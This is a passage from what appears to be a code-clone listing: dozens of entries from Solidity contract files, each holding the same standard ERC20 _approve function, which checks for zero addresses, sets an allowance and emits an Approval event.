    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="97" endline="106" pcid="5930">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="97" endline="106" pcid="6690">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="98" endline="107" pcid="6369">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="96" endline="105" pcid="6140">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="99" endline="108" pcid="8802">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="102" endline="111" pcid="5112">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="97" endline="106" pcid="4260">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="100" endline="109" pcid="468">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="99" endline="108" pcid="5915">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="100" endline="109" pcid="6960">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="97" endline="106" pcid="2070">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="195" endline="204" pcid="7373">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="97" endline="106" pcid="8339">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="100" endline="109" pcid="267">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="103" endline="112" pcid="583">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="102" endline="111" pcid="86">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="95" endline="104" pcid="4290">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="424" endline="433" pcid="5287">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="100" endline="109" pcid="7718">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="98" endline="107" pcid="423">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="98" endline="107" pcid="5966">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="100" endline="109" pcid="1836">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="101" endline="110" pcid="6722">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="100" endline="109" pcid="4937">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="94" endline="103" pcid="4892">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="96" endline="105" pcid="1969">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="97" endline="106" pcid="6040">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="100" endline="109" pcid="1586">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="97" endline="106" pcid="297">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="99" endline="108" pcid="6324">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="93" endline="102" pcid="8856">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="99" endline="108" pcid="2189">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="98" endline="107" pcid="1055">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="96" endline="105" pcid="8249">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="101" endline="110" pcid="8727">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="95" endline="104" pcid="7994">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="99" endline="108" pcid="1299">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="96" endline="105" pcid="3809">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="716" endline="725" pcid="4097">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="201" endline="210" pcid="381">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="94" endline="103" pcid="5007">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="100" endline="109" pcid="7671">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="98" endline="107" pcid="1529">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="96" endline="105" pcid="3991">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="97" endline="106" pcid="8264">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="100" endline="109" pcid="8757">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="98" endline="107" pcid="2174">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x67d726579cdb18830da61472da171f56028b0df1.sol" startline="96" endline="105" pcid="3859">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="95" endline="104" pcid="7748">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="99" endline="108" pcid="699">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="93" endline="102" pcid="7057">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="98" endline="107" pcid="1601">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="96" endline="105" pcid="8324">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="98" endline="107" pcid="4112">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="99" endline="108" pcid="4922">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="94" endline="103" pcid="4368">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="97" endline="106" pcid="7794">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="100" endline="109" pcid="7809">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="100" endline="109" pcid="6219">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="100" endline="109" pcid="4437">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="99" endline="108" pcid="5272">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="97" endline="106" pcid="1166">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="95" endline="104" pcid="3794">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="100" endline="109" pcid="5550">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="99" endline="108" pcid="5257">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="101" endline="110" pcid="7949">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="101" endline="110" pcid="5694">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="96" endline="105" pcid="598">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="97" endline="106" pcid="8384">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="199" endline="208" pcid="6738">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x80243a2b6dfb564459fec3e729fda998a4b7a979.sol" startline="98" endline="107" pcid="4732">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="101" endline="110" pcid="4245">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="97" endline="106" pcid="4877">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xB1426cE1931Bc2f72fF5eEcFf831679B1fe52c3b.sol" startline="95" endline="104" pcid="6521">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="97" endline="106" pcid="4696">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="103" endline="112" pcid="6633">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="97" endline="106" pcid="6874">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="96" endline="105" pcid="6990">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="99" endline="108" pcid="7170">
    function _approve(
        address owner,
